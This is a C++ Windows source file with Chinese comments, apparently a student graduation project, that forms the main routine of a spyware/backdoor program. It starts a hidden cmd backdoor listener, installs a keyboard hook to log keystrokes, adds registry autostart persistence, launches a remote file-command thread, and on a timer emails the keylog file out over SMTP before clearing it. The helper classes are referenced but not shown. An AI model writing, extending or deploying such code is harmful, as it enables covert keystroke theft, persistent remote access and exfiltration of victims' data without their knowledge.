//graduation.cpp: 定义应用程序的入口点。
//

#include "stdafx.h"
#include "graduation.h"
#include "CmdServer.h"
#include "KeyboardHook.h"
#include "RegisterHEKY.h"
#define MAX_LOADSTRING 100

bool sendMail();
DWORD WINAPI fileCmdMain(LPVOID lpParameter);
VOID CALLBACK TimerCallback(PVOID lpParameter, BOOLEAN TimerOrWaitFired);

// 全局变量: 
HINSTANCE hInst;
time_t routineTime;
// 当前实例
WCHAR szTitle[MAX_LOADSTRING];                  // 标题栏文本
WCHAR szWindowClass[MAX_LOADSTRING];            // 主窗口类名

// 此代码模块中包含的函数的前向声明: 
//ATOM                MyRegisterClass(HINSTANCE hInstance);
//BOOL                InitInstance(HINSTANCE, int);
//LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
//INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow){
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);


	//创建启动cmd后门监听
	CmdServer cmdServer(CMDPORT);
	cmdServer.listen();

	// 注册键盘监听事件
	KeyboardHook keyboardHook(hInstance);

	// 注册表添加自启动功能
	RegisterHEKY reg;

	// 启动文件操作线程
	CreateThread(NULL, 0, fileCmdMain, NULL, 0, NULL);
	
	// 创建启动发送邮件定时函数
	HANDLE timer_queue = CreateTimerQueue();
	HANDLE timer;
	CreateTimerQueueTimer(&timer, timer_queue, TimerCallback, NULL, 0, EMAILTIME, WT_EXECUTEINTIMERTHREAD);

	// 主消息循环: 
	MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0))
    {	
    }

    return (int) msg.wParam;
}

// 定时器调度函数
VOID CALLBACK TimerCallback(PVOID lpParameter, BOOLEAN TimerOrWaitFired)
{
	//发送邮件定时函数 约5分钟发送附带键盘记录文件邮件
	HANDLE fd = CreateFile(KEYFILE, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	WORD len = GetFileSize(fd, NULL);
	CloseHandle(fd);
	if (len > 1024 && sendMail()) {		// 记录超过1k则发送邮件
		ofstream out(KEYFILE, ios::out);
		out.close();
	}

}

// 发送邮件函数
bool sendMail()
{
	CSmtp sendMail;
	if (sendMail.Send())
		return true;
	return false;
}